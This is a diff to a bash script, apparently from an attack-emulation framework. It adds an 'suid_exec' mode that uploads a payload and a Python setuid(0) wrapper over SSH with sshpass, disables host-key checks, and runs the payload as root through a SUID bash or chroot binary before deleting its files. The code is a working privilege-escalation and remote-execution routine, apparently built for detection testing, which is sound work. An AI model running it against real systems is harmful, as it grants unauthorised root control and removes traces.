@@ -165,7 +165,7 @@ safe_remote_rm_file() {
 
     case "$path" in
     /tmp/aegis_* | /var/tmp/aegis_* | /dev/shm/aegis_* | /tmp/* | /var/tmp/* | /dev/shm/*)
-        if [[ "${TYPE:-}" == "ssh_auth" || ( "${TYPE:-}" == "root_session" && -n "${USERNAME:-}" && -n "${PASSWORD:-}" ) ]]; then
+        if [[ "${TYPE:-}" == "ssh_auth" || ( ( "${TYPE:-}" == "root_session" || "${TYPE:-}" == "suid_exec" ) && -n "${USERNAME:-}" && -n "${PASSWORD:-}" ) ]]; then
             sshpass -p "$PASSWORD" \
                 ssh -o StrictHostKeyChecking=no \
                 -o UserKnownHostsFile=/dev/null \
@@ -243,7 +243,7 @@ send_delivery_marker() {
 
     q_marker="$(shell_quote "$marker")"
 
-    if [[ "${TYPE:-}" == "root_session" && -n "${USERNAME:-}" && -n "${PASSWORD:-}" ]]; then
+    if [[ ( "${TYPE:-}" == "root_session" || "${TYPE:-}" == "suid_exec" ) && -n "${USERNAME:-}" && -n "${PASSWORD:-}" ]]; then
         ssh_remote_command "$TARGET" "logger -t aegis_attack_marker -- $q_marker" || {
             warn "Failed to send marker to target: $marker"
             return 1
@@ -703,6 +703,157 @@ root_session)
 
     [[ "$SESSION_STATUS" == "0" ]] ||
         fail "Root session payload failed with status: $SESSION_STATUS"
+
+    ;;
+
+suid_exec)
+
+    [[ "${ROOT_EXEC_METHOD:-}" == "suid_bash" ]] ||
+        fail "suid_exec delivery only supports ROOT_EXEC_METHOD=suid_bash"
+
+    [[ -n "${ROOT_EXEC_PATH:-}" ]] ||
+        fail "ROOT_EXEC_PATH/AEGIS_ROOT_EXEC_PATH must be set for suid_exec delivery"
+
+    BUNDLE_SCRIPT="$RUN_DIR/bundled_payload_suid_exec.sh"
+    SETUID_WRAPPER="$RUN_DIR/suid_exec_setuid_wrapper.py"
+    REMOTE_STAGE_DIR="${REMOTE_STAGE_DIR:-/tmp}"
+    REMOTE_PAYLOAD_PATH="${REMOTE_STAGE_DIR%/}/aegis_suid_exec_${RUN_ID}.sh"
+    REMOTE_SETUID_WRAPPER="${REMOTE_STAGE_DIR%/}/aegis_suid_exec_${RUN_ID}_setuid.py"
+    REMOTE_METADATA_TXT="/tmp/aegis_${RUN_ID}_metadata.txt"
+    REMOTE_METADATA_JSON="/tmp/aegis_${RUN_ID}_metadata.json"
+
+    q_root_exec_path="$(shell_quote "$ROOT_EXEC_PATH")"
+    q_root_exec_args="$(shell_quote "${ROOT_EXEC_ARGS:--p}")"
+    q_root_exec_chroot_path="$(shell_quote "${ROOT_EXEC_CHROOT_PATH:-}")"
+    q_remote_stage_dir="$(shell_quote "$REMOTE_STAGE_DIR")"
+    q_remote_payload_path="$(shell_quote "$REMOTE_PAYLOAD_PATH")"
+    q_remote_setuid_wrapper="$(shell_quote "$REMOTE_SETUID_WRAPPER")"
+    q_remote_metadata_txt="$(shell_quote "$REMOTE_METADATA_TXT")"
+    q_remote_metadata_json="$(shell_quote "$REMOTE_METADATA_JSON")"
+
+    log "Building bundled payload for SUID root execution"
+
+    {
+        echo '#!/usr/bin/env bash'
+        echo 'set -euo pipefail'
+        echo
+        emit_bundled_framework
+        echo
+        echo "RUN_ID='$RUN_ID'"
+        echo "CHAIN_ID='$CHAIN_ID'"
+        echo "TARGET_USER='${TARGET_USER:-}'"
+        echo "USERNAME='${USERNAME:-}'"
+        echo "PASSWORD='${PASSWORD:-}'"
+        echo "METADATA_TXT='$REMOTE_METADATA_TXT'"
+        echo "METADATA_JSON='$REMOTE_METADATA_JSON'"
+        echo "init_metadata \"\$METADATA_TXT\" \"\$METADATA_JSON\""
+        echo
+        sed '/^#/d' "$PAYLOAD_CONF"
+        echo
+        sed \
+            -e '/FRAMEWORK_ROOT must be set/d' \
+            -e '/if \[\[ -z "${FRAMEWORK_ROOT:-}" \]\]; then/,/fi/d' \
+            -e '/source "\$FRAMEWORK_ROOT\/lib\//d' \
+            "$PAYLOAD_SCRIPT"
+    } >"$BUNDLE_SCRIPT"
+
+    chmod +x "$BUNDLE_SCRIPT"
+
+cat >"$SETUID_WRAPPER" <<'PYEOF'
+#!/usr/bin/env python3
+import os
+import sys
+
+if len(sys.argv) < 2:
+    raise SystemExit("usage: suid_exec_setuid_wrapper.py <command> [args...]")
+
+os.setgid(0)
+os.setuid(0)
+os.execvp(sys.argv[1], sys.argv[1:])
+PYEOF
+
+    chmod +x "$SETUID_WRAPPER"
+
+    record_metadata "suid_exec_path=$ROOT_EXEC_PATH"
+    record_metadata "suid_exec_args=${ROOT_EXEC_ARGS:--p}"
+    record_metadata "suid_exec_chroot_path=${ROOT_EXEC_CHROOT_PATH:-}"
+    record_metadata "suid_exec_remote_payload=$REMOTE_PAYLOAD_PATH"
+    record_metadata "suid_exec_remote_setuid_wrapper=$REMOTE_SETUID_WRAPPER"
+
+    log "Uploading bundled payload for SUID root execution"
+
+    ssh_remote_command "$TARGET" "mkdir -p $q_remote_stage_dir"
+
+    if [[ -n "${USERNAME:-}" && -n "${PASSWORD:-}" ]]; then
+        sshpass -p "$PASSWORD" \
+            scp -o StrictHostKeyChecking=no \
+            -o UserKnownHostsFile=/dev/null \
+            -o LogLevel=ERROR \
+            "$BUNDLE_SCRIPT" \
+            "$USERNAME@$TARGET:$REMOTE_PAYLOAD_PATH"
+        sshpass -p "$PASSWORD" \
+            scp -o StrictHostKeyChecking=no \
+            -o UserKnownHostsFile=/dev/null \
+            -o LogLevel=ERROR \
+            "$SETUID_WRAPPER" \
+            "$USERNAME@$TARGET:$REMOTE_SETUID_WRAPPER"
+    else
+        scp "$BUNDLE_SCRIPT" "$TARGET:$REMOTE_PAYLOAD_PATH"
+        scp "$SETUID_WRAPPER" "$TARGET:$REMOTE_SETUID_WRAPPER"
+    fi
+
+    add_remote_delivery_cleanup_path "$REMOTE_PAYLOAD_PATH"
+    add_remote_delivery_cleanup_path "$REMOTE_SETUID_WRAPPER"
+    add_remote_delivery_cleanup_path "$REMOTE_METADATA_TXT"
+    add_remote_delivery_cleanup_path "$REMOTE_METADATA_JSON"
+
+    log "Validating SUID root execution primitive"
+
+    ssh_remote_command "$TARGET" "test -u $q_root_exec_path && test -x $q_root_exec_path" ||
+        fail "SUID root exec path is not executable with SUID bit: $ROOT_EXEC_PATH"
+
+    SUID_ROOT_COMMAND="$q_root_exec_path $q_root_exec_args"
+
+    if [[ -n "${ROOT_EXEC_CHROOT_PATH:-}" ]]; then
+        if ssh_remote_command "$TARGET" "test -u $q_root_exec_chroot_path && test -x $q_root_exec_chroot_path" >/dev/null 2>&1; then
+            log "Using SUID chroot wrapper for root execution"
+            SUID_ROOT_COMMAND="$q_root_exec_chroot_path / $q_root_exec_path $q_root_exec_args"
+        else
+            warn "Configured SUID chroot path is not available, using SUID bash directly: $ROOT_EXEC_CHROOT_PATH"
+        fi
+    else
+        DETECTED_CHROOT_PATH="$(
+            ssh_remote_command "$TARGET" "for p in /usr/sbin/chroot /usr/bin/chroot /bin/chroot; do if test -u \"\$p\" && test -x \"\$p\"; then printf '%s\n' \"\$p\"; exit 0; fi; done" 2>/dev/null || true
+        )"
+
+        if [[ -n "$DETECTED_CHROOT_PATH" ]]; then
+            q_detected_chroot_path="$(shell_quote "$DETECTED_CHROOT_PATH")"
+            log "Auto-detected SUID chroot wrapper: $DETECTED_CHROOT_PATH"
+            SUID_ROOT_COMMAND="$q_detected_chroot_path / $q_root_exec_path $q_root_exec_args"
+            record_metadata "suid_exec_detected_chroot_path=$DETECTED_CHROOT_PATH"
+        fi
+    fi
+
+    ssh_remote_command "$TARGET" "$SUID_ROOT_COMMAND -c 'test \"\$(id -u)\" = 0'" ||
+        fail "SUID root exec validation failed: $ROOT_EXEC_PATH"
+
+    SETUID_WRAPPER_UID="$(
+        ssh_remote_command "$TARGET" "$SUID_ROOT_COMMAND -c 'python3 $q_remote_setuid_wrapper env id -u'" |
+            tr -cd '0-9'
+    )"
+
+    [[ "$SETUID_WRAPPER_UID" == "0" ]] ||
+        fail "SUID setuid wrapper validation failed, uid=$SETUID_WRAPPER_UID"
+
+    log "Executing payload through SUID root primitive"
+
+    ssh_remote_command "$TARGET" "chmod +x $q_remote_payload_path $q_remote_setuid_wrapper && timeout $SUID_EXEC_TIMEOUT $SUID_ROOT_COMMAND -c 'python3 $q_remote_setuid_wrapper /bin/bash $q_remote_payload_path'" |
+        tee "$RUN_DIR/scenario_output.log"
+
+    scp_from_remote "$TARGET" "$REMOTE_METADATA_TXT" "$RUN_DIR/remote_metadata.txt" >/dev/null 2>&1 || true
+    scp_from_remote "$TARGET" "$REMOTE_METADATA_JSON" "$RUN_DIR/remote_metadata.json" >/dev/null 2>&1 || true
+
+    ssh_remote_command "$TARGET" "$SUID_ROOT_COMMAND -c 'rm -f -- $q_remote_payload_path $q_remote_setuid_wrapper $q_remote_metadata_txt $q_remote_metadata_json'" >/dev/null 2>&1 || true
 
     ;;
 
